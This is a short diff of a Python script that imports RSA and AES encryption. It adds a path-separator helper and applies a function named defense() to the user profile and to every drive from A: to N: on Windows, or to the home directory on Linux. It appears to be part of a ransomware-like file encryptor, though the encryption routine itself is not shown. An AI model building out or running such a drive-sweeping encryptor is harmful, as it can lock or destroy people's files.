@@ -6,6 +6,12 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
+def splacer():
+    if(platform == 'win32'):
+        return '\\'
+    elif(platform == 'linux'):
+        return '/'
+
 def gext(filename):
     with open(filename,'r') as license:
         ler = license.read()
@@ -66,10 +72,10 @@ if __name__ == '__main__':
     if (platform == 'win32'):
         t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
         for i in range(len(t)):
-            defense(t[i] + '\\')
+            defense(t[i] + splacer())
     elif (platform == 'linux'):
         t = ['~']
         for i in range(len(t)):
-            defense(t[i] + '/')
+            defense(t[i] + splacer())
     else:
         print('I will better')
